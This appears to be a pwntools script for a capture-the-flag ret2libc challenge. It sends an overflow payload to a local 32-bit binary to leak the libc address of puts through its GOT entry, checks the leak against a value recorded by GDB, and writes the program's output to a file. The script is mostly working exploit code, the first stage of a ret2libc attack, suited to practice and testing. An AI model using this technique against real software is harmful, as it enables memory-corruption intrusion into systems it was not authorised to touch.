from pwn import *

import time

import sys

target = process("./chall-test_ret2libc-4-x86")
gdb.attach(target, gdbscript="get_libc_puts_address")

payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8049080)
payload += "0000"
payload += p32(0x804c010)
target.sendline(payload)
foundEnd = False
output = ""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True
if len(output) == 0:
	outputFile = open("justifies", "w")
	outputFile.write("")
	outputFile.close()
	sys.exit(0)
time.sleep(1)
putsFile = open("far-cry", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)
outputLines = output.split("\n")
if len(outputLines) == 1:
	leakLine = outputLines[0]
else:
	leakLine = outputLines[-2]
workingLeakLine = leakLine.strip("\n")
lineLength = 4
if len(workingLeakLine) < 4:
	lineLength = len(workingLeakLine)
hexValues = []
for i in range(1, lineLength + 1):
	currentLeak = str(workingLeakLine[-i:])
	currentAddress = u32(currentLeak + "\x00"*(4-len(currentLeak)))
	print(hex(currentAddress))
	if currentAddress == putsAddress:
		savedIndex = i
		break
finalFillerOutput = leakLine[:-savedIndex]
fillerOutput = outputLines[:-2]
fillerOutput.append(finalFillerOutput)
fillerOutput = "\\n".join(fillerOutput)
outputFile = open("justifies", "w")
outputFile.write(fillerOutput)
outputFile.close()
